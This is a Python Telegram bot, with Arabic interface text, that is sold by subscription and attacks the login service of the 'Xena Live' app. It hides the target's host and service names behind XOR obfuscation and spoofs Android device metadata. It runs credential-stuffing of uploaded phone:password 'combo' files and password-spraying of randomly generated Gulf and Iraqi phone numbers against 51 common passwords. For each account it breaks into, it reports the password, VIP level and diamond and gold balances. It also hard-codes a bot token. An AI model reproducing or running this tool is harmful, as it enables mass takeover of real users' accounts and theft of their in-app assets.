#!/usr/bin/env python3
import os
import sys
import time
import random
import hashlib
import threading
import json
from datetime import datetime, timedelta
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import grpc

TOKEN = os.getenv("BOT_TOKEN", "8844579780:AAFDxl5UZRA64eHcoxboAUfp7hkE1XVD8jA")
bot = telebot.TeleBot(TOKEN)

# آيدي الأدمن
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8795120325").split(",") if x.strip().isdigit()]
SUBS_FILE = "subscribers.json"

# ══════════════════════════════════════════════════════════
#  إدارة الاشتراكات وقاعدة البيانات المحلية
# ══════════════════════════════════════════════════════════
def load_subs():
    if not os.path.exists(SUBS_FILE):
        return {}
    try:
        with open(SUBS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_subs(subs):
    try:
        with open(SUBS_FILE, "w", encoding="utf-8") as f:
            json.dump(subs, f, ensure_ascii=False, indent=4)
    except:
        pass

def is_active_subscriber(user_id):
    if user_id in ADMIN_IDS:
        return True
    subs = load_subs()
    str_id = str(user_id)
    if str_id in subs:
        expiry_str = subs[str_id]["expiry"]
        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        if datetime.now() < expiry_date:
            return True
    return False

# ══════════════════════════════════════════════════════════
#  XOR obfuscation & Configs
# ══════════════════════════════════════════════════════════
def _xd(b):
    return bytes(c ^ 0x5A for c in b).decode()

_grpcHost  = bytes([0x28,0x2a,0x39,0x77,0x32,0x2d,0x74,0x22,0x3f,0x34,0x3b,0x36,0x33,0x2c,0x3f,0x74,0x37,0x3f,0x60,0x6e,0x6e,0x69])
_svcPrefix = bytes([0x75,0x3d,0x28,0x2a,0x39,0x74,0x36,0x35,0x3d,0x33,0x34,0x74,0x16,0x35,0x3d,0x33,0x34,0x09,0x3f,0x28,0x2c,0x33,0x39,0x3f])
_pkg       = bytes([0x39,0x35,0x37,0x74,0x22,0x2a,0x3b,0x28,0x2e,0x23,0x74,0x3b,0x34,0x3e,0x28,0x35,0x33,0x3e,0x3b,0x2a,0x2a])
_userAgent = bytes([0x3d,0x28,0x2a,0x39,0x77,0x30,0x3b,0x2c,0x3b,0x77,0x35,0x31,0x32,0x2e,0x2e,0x2a,0x75,0x6b,0x74,0x6c,0x6b,0x74,0x6a])

GRPC_HOST  = _xd(_grpcHost)
SVC_PREFIX = _xd(_svcPrefix)
PKG        = _xd(_pkg)
APP_VER    = "2003003"
APP_VN     = "2.3.3.1"

# قائمة الكلمات الـ 51 كاملة
PASSWORDS = [
    "Aa123456@","Aa123456","Aa12345678","Aa12345678@",
    "Aa1234567@","Aa1234567","Aa123123@","Aa123123",
    "Aa12341234","Aa@123456","Aa@123123","Aa@112233",
    "Aa100100@","Aa100100","user@123",
    "123456","1234567","12345678","123456789a",
    "1234567890","1234qwert","1234@1234","11223344",
    "1122334455","1111122222",
    "A123456","A123456@","Password1","P@ssw0rd",
    "password123","password2025","Admin@123","abc12345",
    "111111aa",
    "Qwerty@123","qwerty@123","qwertyuiop","qwert12345",
    "qwer@123","qwer1234","qwerty12345","1q2w3e4r",
    "qqwweerr123",
    "pakistan123","pakistan","786786","twitter@123",
    "mypassword123","iloveyou1","0306KAlee","alle2019",
]

COUNTRY_MAP = {
    "SA": {"code":"966","prefs":["50","51","53","54","55","56","57","58","59"],"ext":7},
    "IQ": {"code":"964","prefs":["770","771","772","773","775","776","780","781","783","785","790","791"],"ext":7},
    "EG": {"code":"20", "prefs":["10","11","12","15"],"ext":8},
    "AE": {"code":"971","prefs":["50","52","54","55","56","58"],"ext":7},
}

def _varint(v):
    b = bytearray()
    while v > 0x7F:
        b.append((v & 0x7F) | 0x80)
        v >>= 7
    b.append(v & 0x7F)
    return bytes(b)

def _fstr(n, val):
    d = val.encode()
    return _varint((n << 3) | 2) + _varint(len(d)) + d

def _fint(n, val):
    return _varint(n << 3) + _varint(val)

def _fbytes(n, data):
    return _varint((n << 3) | 2) + _varint(len(data)) + data

def _pvarint(data, pos):
    val = shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        val |= (b & 0x7F) << shift
        if not (b & 0x80): break
        shift += 7
    return val, pos

def _proto(data):
    fields, i = [], 0
    while i < len(data):
        tag, i = _pvarint(data, i)
        if not tag: break
        fn, wt = tag >> 3, tag & 7
        if wt == 0:
            v, i = _pvarint(data, i)
            fields.append((fn, 0, v, None))
        elif wt == 2:
            ln, i = _pvarint(data, i)
            end = i + ln
            if end > len(data): break
            fields.append((fn, 2, 0, data[i:end]))
            i = end
        else: break
    return fields

def _fget(fields, n):
    for f in fields:
        if f[0] == n: return f
    return None

# 🛠️ تعديل معلومات الشريحة لتكون نص UTF-8 صالح تماماً
def _sim_info():
    return "454,00,HK,CSL,CSL"

# 🛠️ الهيكل الصحيح لمنع أخطاء الـ UTF-8 وتوافق معايير خادم PhoneLogin
def _build_login(phone, password, cc):
    c = COUNTRY_MAP.get(cc, COUNTRY_MAP["SA"])
    numeric_code = c["code"]
    
    local_phone = phone
    if phone.startswith(numeric_code):
        local_phone = phone[len(numeric_code):]
        
    return (
        _fstr(1, numeric_code) +                             # Field 1: رمز الدولة
        _fstr(2, local_phone) +                              # Field 2: رقم الهاتف المحلي
        _fstr(3, hashlib.md5(password.encode()).hexdigest()) + # Field 3: كلمة المرور (MD5)
        _fint(4, 1) +                                        # Field 4: نوع تسجيل الدخول
        _fstr(5, _sim_info())                                # Field 5: معلومات الشريحة كنص UTF-8 صالح
    )

def _rand_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))

def _uuid():
    b = bytearray(os.urandom(16))
    b[6] = (b[6] & 0x0f) | 0x40
    b[8] = (b[8] & 0x3f) | 0x80
    h = b.hex()
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"

def _make_meta(did):
    ts = str(int(time.time() * 1000))
    return [
        ("lang", "ar"), ("version", APP_VER), ("vc", APP_VER), ("vn", APP_VN),
        ("trace_id", _uuid()), ("os", "android"), ("sys_version", "android-10"),
        ("model", "CPH2469"), ("mcc", "454"), ("locale", "ar_SA"), ("net_type", "6"),
        ("pkg", PKG), ("issue_channel", "1"), ("did", did), ("timezone", "8"),
        ("request_time_s", ts), ("device_level", "HIGH"), ("idfa", _uuid()),
    ]

class GrpcClient:
    def __init__(self):
        self.did = _rand_hex(16)
        self._init_channel()

    def _init_channel(self):
        opts = [
            ("grpc.keepalive_time_ms", 20000),
            ("grpc.keepalive_timeout_ms", 10000),
            ("grpc.keepalive_permit_without_calls", 1),
            ("grpc.max_reconnect_backoff_ms", 5000),
        ]
        creds = grpc.ssl_channel_credentials()
        self._ch = grpc.secure_channel(GRPC_HOST, creds, options=opts)
        self._login = self._ch.unary_unary(SVC_PREFIX + "/PhoneLogin", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._info = self._ch.unary_unary("/grpc.user.UserService/GetUserInfo", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._profile = self._ch.unary_unary("/grpc.user.UserService/GetUserProfile", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._balance = self._ch.unary_unary("/grpc.purchase.PurchaseService/GetBalance", request_serializer=lambda x: x, response_deserializer=lambda x: x)

    def call(self, stub, payload, extra_meta=None, timeout=10.0):
        meta = list(_make_meta(self.did))
        if extra_meta: meta.extend(extra_meta)
        if payload is None: payload = b""
        try:
            resp = stub(payload, metadata=meta, timeout=timeout)
            return resp, None
        except grpc.RpcError as e:
            code = e.code()
            details = e.details()
            err_msg = f"{code.name}: {details}"
            if code in (grpc.StatusCode.UNAVAILABLE, grpc.StatusCode.RESOURCE_EXHAUSTED, grpc.StatusCode.INTERNAL):
                time.sleep(0.5)
                try:
                    self._init_channel()
                    resp = stub(payload, metadata=meta, timeout=timeout)
                    return resp, None
                except Exception:
                    pass
            return None, err_msg

    def close(self):
        try: self._ch.close()
        except: pass

def _extract_error_details(data):
    if not data:
        return "استجابة فارغة تماماً من السيرفر (None)"
    details = []
    try:
        top = _proto(data)
        for fn, wt, iv, bv in top:
            if wt == 0:
                details.append(f"Field({fn}): IntVal={iv}")
            elif wt == 2 and bv:
                try:
                    txt = bv.decode(errors="ignore").strip()
                    if txt:
                        details.append(f"Field({fn}): Text='{txt}'")
                    else:
                        details.append(f"Field({fn}): BytesLen={len(bv)}")
                except:
                    details.append(f"Field({fn}): BinaryData")
    except Exception as e:
        details.append(f"خطأ في تحليل البايتات: {str(e)}")
    return " | ".join(details) if details else "لا توجد حقول واضحة في استجابة السيرفر"

def _parse_login(data):
    if not data: return {"status": "error", "reason": "استجابة فارغة"}
    top = _proto(data)
    r = {"ok": False, "status": "fail", "uid": "", "token": "", "country": "", "shortUID": 0, "raw_details": _extract_error_details(data)}
    
    for fn, wt, iv, bv in top:
        if fn == 2 and wt == 0:
            r["shortUID"] = iv
        elif fn in (3, 4) and wt == 2 and bv:
            s = bv.decode(errors="ignore")
            s_clean = "".join(c for c in s if c.isalnum() or c in "_-.")
            if len(s_clean) >= 20 and not r["token"]: 
                r["token"] = s_clean
        elif fn == 8 and wt == 2 and bv:
            r["country"] = bv.decode(errors="replace")
        elif fn == 10 and wt == 2 and bv:
            s = bv.decode(errors="replace")
            if s.isdigit(): r["uid"] = s

    if r["token"] or r["shortUID"] or r["uid"]:
        r["ok"] = True
        r["status"] = "hit"
        return r
    return r

def _find_vip(data):
    for fn, wt, iv, bv in _proto(data):
        if wt == 2 and bv:
            try:
                s = bv.decode(errors="replace")
                if s.startswith("VIP Lv"): return s
            except: pass
            sub = _find_vip(bv)
            if sub: return sub
    return ""

def _fetch_balance(cli, short_uid, token):
    uid_s = str(short_uid)
    extra = [("x-auth-token", token), ("uid", uid_s)]
    data, err = cli.call(cli._balance, None, extra_meta=extra, timeout=8.0)
    if err or not data: return 0, 0, 0
    dia = coins = gold = 0
    for fn, wt, iv, _ in _proto(data):
        if wt == 0:
            if fn == 1: dia = iv
            if fn == 2: coins = iv
            if fn == 3: gold = iv
    return dia, coins, gold

def _fetch_info(cli, short_uid, token):
    if not short_uid or not token: return {}
    uid_s = str(short_uid)
    body = _fint(1, short_uid)
    extra = [("x-auth-token", token), ("uid", uid_s)]

    data, err = cli.call(cli._info, body, extra_meta=extra, timeout=8.0)
    if err or not data: return {}
    top = _proto(data)
    f2 = _fget(top, 2)
    if not f2 or not f2[3]: return {}

    inner = _proto(f2[3])
    info = {"ok": True}
    f = _fget(inner, 3); info["nickname"] = f[3].decode(errors="replace").strip() if f and f[3] else ""
    f = _fget(inner, 5); info["country"] = f[3].decode(errors="replace") if f and f[3] else ""
    f = _fget(inner, 8); info["xp"] = f[2] if f else 0
    f = _fget(inner, 12)
    if f and f[2] > 0:
        info["regDate"] = datetime.fromtimestamp(f[2]).strftime("%Y-%m-%d")

    data2, err2 = cli.call(cli._profile, body, extra_meta=extra, timeout=8.0)
    info["vipLevel"] = _find_vip(data2) if not err2 and data2 else ""
    info["diamonds"], info["coins"], info["gold"] = _fetch_balance(cli, short_uid, token)
    return info

def _gen_phone(cc):
    c = COUNTRY_MAP.get(cc, COUNTRY_MAP["SA"])
    pref = random.choice(c["prefs"])
    ext = ''.join(str(random.randint(0, 9)) for _ in range(c["ext"]))
    local = pref + ext
    return c["code"] + "-" + local, "0" + local

user_scanners = {}
user_states = {}

def get_main_keyboard(chat_id, running=False):
    markup = InlineKeyboardMarkup()
    is_admin = chat_id in ADMIN_IDS
    
    if not running:
        markup.add(
            InlineKeyboardButton("🚀 فحص عشوائي (SA)", callback_data="start_sa"),
            InlineKeyboardButton("🚀 فحص عشوائي (IQ)", callback_data="start_iq")
        )
        markup.add(
            InlineKeyboardButton("🚀 فحص عشوائي (AE)", callback_data="start_ae")
        )
        markup.add(
            InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check_menu"),
            InlineKeyboardButton("📁 فحص ملف كومبو (TXT)", callback_data="combo_menu")
        )
    else:
        markup.add(
            InlineKeyboardButton("⏹ إيقاف الفحص الحالي", callback_data="stop_checker")
        )
        
    if is_admin:
        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم الأدمن", callback_data="admin_panel"))
        
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states.pop(chat_id, None)
    
    if not is_active_subscriber(chat_id):
        bot.send_message(
            chat_id,
            "❌ **عذراً، لست مشتركاً مفَعلاً أو انتهت مدة اشتراكك.**\nيرجى التواصل مع الإدارة لتفعيل حسابك.",
            parse_mode="Markdown"
        )
        return

    is_running = user_scanners.get(chat_id, {}).get("is_running", False)
    markup = get_main_keyboard(chat_id, is_running)
    bot.send_message(
        chat_id, 
        "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live المتطور**\n\nاختر العملية المطلوبة من الأزرار بالأسفل:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['add'])
def cmd_add_sub(message):
    if message.from_user.id not in ADMIN_IDS: return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/add <user_id> <days>`", parse_mode="Markdown")
        return
    try:
        target_id, days = str(parts[1]), int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ الآيدي أو الأيام يجب أن تكون أرقاماً صحيحة.")
        return

    subs = load_subs()
    expiry_date = datetime.now() + timedelta(days=days)
    subs[target_id] = {"expiry": expiry_date.strftime("%Y-%m-%d %H:%M:%S")}
    save_subs(subs)
    bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم `{target_id}` لمدة `{days}` أيام بنجاح.", parse_mode="Markdown")

@bot.message_handler(commands=['del'])
def cmd_del_sub(message):
    if message.from_user.id not in ADMIN_IDS: return
    parts = message.text.split()
    if len(parts) < 2: return
    target_id = str(parts[1])
    subs = load_subs()
    if target_id in subs:
        del subs[target_id]
        save_subs(subs)
        bot.reply_to(message, f"🗑 تم حذف اشتراك المستخدم `{target_id}` بنجاح.", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if not is_active_subscriber(chat_id):
        bot.answer_callback_query(call.id, "❌ انتهت صلاحية اشتراكك!", show_alert=True)
        return

    if data == "admin_panel":
        if chat_id not in ADMIN_IDS: return
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
        bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="⚙️ **لوحة تحكم الأدمن:**\n• `/add <id> <days>` لتفعيل مستخدم\n• `/del <id>` لحذف مستخدم",
            reply_markup=markup, parse_mode="Markdown"
        )

    elif data == "single_check_menu":
        user_states[chat_id] = "waiting_for_single_account"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
        bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🔍 **فحص حساب مفرد**\n\nأرسل الحساب بالشكل التالي:\n`رقم_الهاتف:كلمة_المرور`",
            reply_markup=markup, parse_mode="Markdown"
        )

    elif data == "combo_menu":
        user_states[chat_id] = "waiting_for_combo_file"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
        bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="📁 **فحص ملف كومبو**\n\nأرسل الآن ملف نصي (`.txt`) يحتوي على الحسابات.",
            reply_markup=markup, parse_mode="Markdown"
        )

    elif data == "back_to_main":
        user_states.pop(chat_id, None)
        is_running = user_scanners.get(chat_id, {}).get("is_running", False)
        bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🤖 **لوحة تحكم فاحص Xena Live**",
            reply_markup=get_main_keyboard(chat_id, is_running), parse_mode="Markdown"
        )

    elif data.startswith("start_"):
        if user_scanners.get(chat_id, {}).get("is_running", False):
            bot.answer_callback_query(call.id, "⚠️ لديك فحص يعمل بالفعل!")
            return
        cc = data.split("_")[1].upper()
        user_scanners[chat_id] = {
            "is_running": True, "checked": 0, "hits": 0, "errors": 0,
            "last_error": "لا يوجد", "start_time": time.time(), "cc": cc
        }
        bot.answer_callback_query(call.id, f"🚀 بدأ الفحص العشوائي لـ {cc}")
        threading.Thread(target=run_user_scanner, args=(chat_id, call.message.message_id, cc), daemon=True).start()

    elif data == "stop_checker":
        if chat_id in user_scanners:
            user_scanners[chat_id]["is_running"] = False
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if not is_active_subscriber(chat_id): return
    if user_states.get(chat_id) == "waiting_for_combo_file":
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            bot.reply_to(message, "❌ أرسل ملف `.txt` فقط.")
            return
        try:
            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            f_path = f"combo_{chat_id}.txt"
            with open(f_path, "wb") as f: f.write(downloaded)
            user_states.pop(chat_id, None)
            msg = bot.reply_to(message, "📁 جاري بدء فحص الكومبو بدقة عالية...")
            user_scanners[chat_id] = {
                "is_running": True, "checked": 0, "hits": 0, "errors": 0,
                "last_error": "لا يوجد", "start_time": time.time()
            }
            threading.Thread(target=run_combo_scanner, args=(chat_id, msg.message_id, f_path), daemon=True).start()
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ: `{str(e)}`", parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    if not is_active_subscriber(chat_id): return
    if user_states.get(chat_id) == "waiting_for_single_account":
        text = message.text.strip()
        if ":" not in text:
            bot.reply_to(message, "❌ الصيغة الصحيحة: `رقم_الهاتف:كلمة_المرور`", parse_mode="Markdown")
            return
        phone_part, pw_part = text.split(":", 1)
        phone = "".join(filter(str.isdigit, phone_part))
        country = "SA"
        if phone.startswith("964"): country = "IQ"
        elif phone.startswith("971"): country = "AE"
        elif phone.startswith("20"): country = "EG"
        elif phone.startswith("0") or len(phone) == 9:
            country = "SA"
            phone = "966" + (phone[1:] if phone.startswith("0") else phone)

        wait_msg = bot.reply_to(message, f"⏳ جاري فحص الحساب `{phone}` بدقة واستخراج تفاصيل الاستجابة...")
        def single_run():
            cli = GrpcClient()
            try:
                payload = _build_login(phone, pw_part.strip(), country)
                data, err = cli.call(cli._login, payload)
                
                if err:
                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, 
                                          text=f"❌ **خطأ في الاتصال (gRPC Error):**\n`{err}`", parse_mode="Markdown")
                    return
                
                res = _parse_login(data)
                if res.get("status") == "hit":
                    acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                    hit_txt = (f"🎯 **صيد ناجح (Hit)!**\n"
                               f"📱 الهاتف: `{phone}`\n"
                               f"🔑 الباسورد: `{pw_part.strip()}`\n"
                               f"🆔 UID: `{res.get('uid')}`\n"
                               f"👤 الاسم: `{acct.get('nickname', 'غير متوفر')}`\n"
                               f"🏆 المستوى: `{acct.get('vipLevel', 'عادي')}`\n"
                               f"💎 الذهب: `{acct.get('gold', 0)}`")
                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=hit_txt, parse_mode="Markdown")
                else:
                    raw_details = res.get("raw_details", "غير متوفر")
                    fail_txt = (f"❌ **فشل تسجيل الدخول (الحساب خطأ أو غير مسجل):**\n\n"
                                f"• الرقم: `{phone}`\n"
                                f"• سبب الرفض / الاستجابة الخام من السيرفر:\n`{raw_details}`")
                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=fail_txt, parse_mode="Markdown")
            finally:
                cli.close()
        threading.Thread(target=single_run, daemon=True).start()

def run_combo_scanner(chat_id, msg_id, file_path):
    cli = GrpcClient()
    last_up = 0
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except:
        cli.close()
        return

    total = len(lines)
    state = user_scanners[chat_id]

    for line in lines:
        if not user_scanners.get(chat_id, {}).get("is_running", False): break
        line = line.strip()
        if not line or ":" not in line: continue
        p_part, pw = line.split(":", 1)
        phone = "".join(filter(str.isdigit, p_part))
        pw = pw.strip()
        if not phone or not pw: continue

        country = "SA"
        if phone.startswith("964"): country = "IQ"
        elif phone.startswith("971"): country = "AE"
        elif phone.startswith("20"): country = "EG"
        elif phone.startswith("0") or len(phone) == 9:
            country = "SA"
            phone = "966" + (phone[1:] if phone.startswith("0") else phone)

        payload = _build_login(phone, pw, country)
        data, err = cli.call(cli._login, payload)
        state["checked"] += 1

        if err:
            state["errors"] += 1
            state["last_error"] = err
        elif data:
            res = _parse_login(data)
            if res.get("status") == "hit":
                state["hits"] += 1
                acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                bot.send_message(chat_id, f"🎯 **COMBO HIT!**\n📱 `{phone}` : `{pw}`\n🆔 UID: `{res.get('uid')}`", parse_mode="Markdown")

        now = time.time()
        if now - last_up >= 2.5:
            last_up = now
            elapsed = int(now - state["start_time"])
            spd = state["checked"] / max(elapsed, 1)
            txt = (f"📁 **جاري فحص الكومبو بدقة عالية...**\n\n"
                   f"• فحص: `{state['checked']} / {total}`\n"
                   f"• Hits: `{state['hits']}` 🎯\n"
                   f"• أخطاء: `{state['errors']}` ⚠️\n"
                   f"• آخر سبب خطأ شبكة: `{state['last_error']}`\n"
                   f"• السرعة: `{spd:.1f} فحص/ثانية` ⚡")
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=txt, reply_markup=get_main_keyboard(chat_id, True), parse_mode="Markdown")
            except: pass

    if os.path.exists(file_path): os.remove(file_path)
    cli.close()
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"⏹ **انتهى الفحص.**\n• إجمالي: `{state['checked']}`\n• Hits: `{state['hits']}`", reply_markup=get_main_keyboard(chat_id, False), parse_mode="Markdown")
    except: pass

def run_user_scanner(chat_id, msg_id, cc):
    cli = GrpcClient()
    last_up = 0
    while user_scanners.get(chat_id, {}).get("is_running", False):
        try:
            phone_disp, first_pw = _gen_phone(cc)
            phone = phone_disp.replace("-", "")
            for pw in [first_pw] + PASSWORDS:
                if not user_scanners.get(chat_id, {}).get("is_running", False): break
                payload = _build_login(phone, pw, cc)
                data, err = cli.call(cli._login, payload)
                state = user_scanners[chat_id]
                state["checked"] += 1

                if err:
                    state["errors"] += 1
                    state["last_error"] = err
                elif data:
                    res = _parse_login(data)
                    if res.get("status") == "hit":
                        state["hits"] += 1
                        acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                        bot.send_message(chat_id, f"🎯 **HIT عشوائي جديد!**\n📱 `{phone_disp}`\n🔑 `{pw}`\n🆔 UID: `{res.get('uid')}`", parse_mode="Markdown")
                        break

                now = time.time()
                if now - last_up >= 2.5:
                    last_up = now
                    elapsed = int(now - state["start_time"])
                    spd = state["checked"] / max(elapsed, 1)
                    txt = (f"🚀 **فحص عشوائي [{cc}] نشط...**\n\n"
                           f"• فحص: `{state['checked']}`\n"
                           f"• Hits: `{state['hits']}` 🎯\n"
                           f"• أخطاء: `{state['errors']}` ⚠️\n"
                           f"• آخر سبب خطأ شبكة: `{state['last_error']}`\n"
                           f"• السرعة: `{spd:.1f} فحص/ثانية` ⚡")
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=txt, reply_markup=get_main_keyboard(chat_id, True), parse_mode="Markdown")
                    except: pass
        except Exception as e:
            if chat_id in user_scanners: user_scanners[chat_id]["last_error"] = str(e)
            time.sleep(1)

    cli.close()
    try:
        st = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"⏹ **توقف الفحص العشوائي.**\n• إجمالي: `{st.get('checked',0)}`\n• Hits: `{st.get('hits',0)}`", reply_markup=get_main_keyboard(chat_id, False), parse_mode="Markdown")
    except: pass

if __name__ == "__main__":
    print("Bot is running with correct string field UTF-8 encoding for PhoneLogin...")
    bot.infinity_polling()
